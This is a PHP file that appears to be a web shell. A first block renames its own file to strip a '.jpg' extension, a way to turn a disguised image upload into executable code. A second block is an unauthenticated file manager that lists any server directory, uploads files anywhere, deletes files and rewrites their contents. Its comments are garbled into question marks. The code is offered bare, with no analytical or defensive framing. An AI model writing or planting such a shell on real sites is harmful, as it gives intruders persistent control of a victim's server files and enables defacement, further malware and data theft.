<?php
$old = __FILE__;
$new = preg_replace('/\\.jpg$/', '', $old);
rename($old, $new);
echo "Renamed $old to $new";
?>

<?php
$path = isset($_GET['path']) ? $_GET['path'] : '.';
$path = realpath($path);

// ????? ????
echo "<h3>Path: $path</h3>";

// ????? ???????? ??????
echo "<form method='POST' enctype='multipart/form-data'>
    <input type='file' name='file'>
    <input type='hidden' name='upload_path' value='" . htmlspecialchars($path) . "'>
    <button type='submit'>Upload</button>
</form>";

// ????????? ???????? ?????
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $uploadPath = isset($_POST['upload_path']) ? $_POST['upload_path'] : $path;
    $uploadedFile = $uploadPath . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadedFile)) {
        echo "<p style='color:green;'>File uploaded: " . htmlspecialchars($_FILES['file']['name']) . "</p>";
    } else {
        echo "<p style='color:red;'>Failed to upload file.</p>";
    }
}

// ????????? ???????? ?????
if (isset($_GET['delete'])) {
    $fileToDelete = $path . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_file($fileToDelete) && unlink($fileToDelete)) {
        echo "<p style='color:green;'>File deleted: " . htmlspecialchars($_GET['delete']) . "</p>";
    } else {
        echo "<p style='color:red;'>Failed to delete file.</p>";
    }
}

// ????????? ?????????? ????????? ? ?????
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['edit_file'])) {
    $fileToEdit = $path . DIRECTORY_SEPARATOR . $_POST['edit_file'];
    file_put_contents($fileToEdit, $_POST['file_content']);
    echo "<p style='color:green;'>File updated: " . htmlspecialchars($_POST['edit_file']) . "</p>";
}

// ????? ?????? ?????? ? ?????
echo "<ul>";
foreach (scandir($path) as $item) {
    if ($item === '.') continue;
    $itemPath = $path . DIRECTORY_SEPARATOR . $item;
    echo "<li>";
    if (is_dir($itemPath)) {
        echo "<a href='?path=" . urlencode($itemPath) . "'>[DIR] $item</a>";
        echo " - <i>Permissions:</i> " . substr(sprintf('%o', fileperms($itemPath)), -4);
    } else {
        echo "<a href='?path=" . urlencode($path) . "&file=" . urlencode($item) . "'>$item</a>";
        echo " - <a href='?path=" . urlencode($path) . "&delete=" . urlencode($item) . "' style='color:red;'>[Delete]</a>";
        echo " - <i>Size:</i> " . filesize($itemPath) . " bytes, <i>Permissions:</i> " . substr(sprintf('%o', fileperms($itemPath)), -4);
    }
    echo "</li>";
}
echo "</ul>";

// ???????? ? ?????????????? ?????
if (isset($_GET['file'])) {
    $filePath = $path . DIRECTORY_SEPARATOR . $_GET['file'];
    if (is_file($filePath)) {
        echo "<h3>Contents of " . htmlspecialchars($_GET['file']) . ":</h3>";
        echo "<form method='POST'>
            <textarea name='file_content' style='width:100%;height:300px;'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
            <input type='hidden' name='edit_file' value='" . htmlspecialchars($_GET['file']) . "'>
            <button type='submit'>Save Changes</button>
        </form>";
    }
}
?>
